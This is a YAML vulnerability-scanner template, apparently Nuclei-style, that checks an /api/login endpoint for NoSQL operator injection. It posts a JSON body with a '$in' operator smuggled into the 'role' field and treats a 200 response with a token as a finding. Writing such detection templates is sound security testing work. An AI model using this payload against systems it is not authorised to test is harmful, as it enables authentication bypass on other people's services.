id: nosql-24
name: 'NoSQL $in in role'
severity: high
type: active
tags:
  - nosql
  - injection
  - api
description: 'NoSQL operator $in accepted on /api/login'
requests:
  - method: POST
    path: '{{BaseURL}}/api/login'
    body: '{"role":{"$in":""},"extra":"x"}'
    match-all: true
    matchers:
      - type: status
        status: [200]
      - type: regex
        part: body
        regex:
          - '"token"\s*:'
